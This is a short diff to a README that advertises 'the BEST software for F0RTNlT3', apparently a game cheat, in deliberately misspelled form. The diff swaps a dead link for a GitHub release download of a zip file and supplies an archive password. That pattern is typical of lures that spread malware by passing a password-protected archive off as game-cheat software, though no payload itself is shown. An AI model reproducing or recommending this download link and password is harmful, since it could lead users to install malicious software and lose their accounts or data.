@@ -11,7 +11,7 @@
 
 <p align="center">the BEST software for F0RTNlT3</p>
 
-# [Download](404)
+# [Download](https://github.com/colazhb/FORTNlTE-sovtaim/releases/download/sovt/software.zip)
 
 ## ARCHIVE PASS - FT-svt1337
 
